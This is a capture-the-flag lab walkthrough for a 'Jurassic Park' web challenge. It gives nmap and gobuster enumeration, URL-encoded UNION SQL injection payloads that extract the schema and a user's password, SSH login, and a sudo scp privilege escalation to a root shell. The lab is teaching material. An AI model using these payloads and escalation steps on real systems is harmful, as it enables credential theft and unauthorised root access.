# Jurassic Park CTF

## This medium-hard task will require you to enumerate the web application, get credentials to the server and find four flags hidden around the file system. Oh, **Dennis** Nedry has helped us to secure the app too.

### What is the name of the SQL database serving the shop information?

1. Start by port enumeration, there are only two open ports

```bash
nmap -p- -Pn <IP>
```

- `-p-`: Allow us to scan all 65535 TCP ports
- `-Pn`: Skips the host discovery process (ping scan)

![SCREEN01](https://github.com/user-attachments/assets/8be95842-fa3c-4227-8139-53d25c681efb)

2. Gobuster doesn't give us much more, just `/delete` and `/assets`. But in `/delete` there is information that `Ubuntu` is the OS, and database is `MySQL`

```bash
gobuster dir -u http://<IP> -w /root/Tools/wordlists/dirbuster/directory-list-1.0.txt
```

- `-u`: Specifies the URL to scan
- `-w`: Specifies the wordlist file used for brute-forcing

![SCREEN02](https://github.com/user-attachments/assets/8858a950-99a4-4ce2-9e04-d1f1fb25c37b)

3. Going through the shop we can spot interesting url that is `<IP>/item.php?id=1`. If we put `'` at the end we will get caught

4. Use [Cyber Chief](https://gchq.github.io/CyberChef) URL Encode to prepare injection payload

```SQL
0 UNION SELECT 1,database(),3,4,5
```

![SCREEN03](https://github.com/user-attachments/assets/56af34d8-387e-4d32-b30d-1ff3f8f6edc9)

### How many columns does the table have?

1. If we go above 5, we will get an error '**Unknown column '6' in 'order clause'**'

```SQL
0 UNION SELECT 1,2,3,4,5
```

### What is the system version?

1. We can use payload like this to display version

```SQL
0 UNION SELECT 1,2,version(),4,5
```

![SCREEN04](https://github.com/user-attachments/assets/45677af5-4b49-4a86-b588-d297f0979259)

### What is Dennis' password?

1. First let's find out other tables

```SQL
0 UNION SELECT 1,2,group_concat(table_name),4,5 from information_schema.tables where table_schema = database()
```

![SCREEN05](https://github.com/user-attachments/assets/293644c2-96c3-47a4-a439-65e0ea74a67d)

2. Columns in `users`

```SQL
0 UNION SELECT 1,2,group_concat(column_name),4,5 from information_schema.columns where table_name = "users"
```

![SCREEN06](https://github.com/user-attachments/assets/1845ad5e-fc8c-4f47-ac20-a71fc9e87531)

3. Now get password, we already know the name

```SQL
0 UNION SELECT 1,2,3,password,5 from users
```

![SCREEN07](https://github.com/user-attachments/assets/11004dde-b10c-4aff-a732-8f70d6c16b49)

### What are the contents of the first flag?

1. Login using ssh

```Bash
ssh dennis@<IP>
```

![SCREEN08](https://github.com/user-attachments/assets/e0fcec40-7eeb-401e-ad07-8701561aef53)

2. The flag is right when we started

```Bash
cat flag1.txt
```

![SCREEN09](https://github.com/user-attachments/assets/9b4e6816-2450-47ca-ab25-bc8a28497304)

### What are the contents of the second flag?

1. Let's get root access to move around more easily

```Bash
sudo -l
```

2. Check [GTFOBins](https://gtfobins.github.io/gtfobins/scp/) for `scp`, use the sudo commands and upgrade our shell

```Bash
TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF
chmod +x "$TF"
sudo scp -S $TF x y:

python -c 'import pty; pty.spawn("/bin/bash")'
```

![SCREEN11](https://github.com/user-attachments/assets/39a54e47-de69-4c55-85a0-0f0f5f8b71d8)

3. Let's try to find more

```Bash
find / -type f -name "*flag*.*"
cat /boot/grub/fonts/flagTwo.txt
```

![SCREEN12](https://github.com/user-attachments/assets/409be678-2b24-46d9-b695-880b74380372)

### What are the contents of the third flag?

1. Third flag is hidden in history:

```Bash
history
```

![SCREEN13](https://github.com/user-attachments/assets/52612708-1483-4975-858a-d600e753a5c0)

### What are the contents of the fifth flag?

1. In `home/dennis/` there is `test.sh` which points to the `/root/flag5.txt`

```Bash
cat test.sh
cat /root/flag5.txt
```

![SCREEN14](https://github.com/user-attachments/assets/f669c4b6-7a40-440f-a107-85a547b8ebe6)
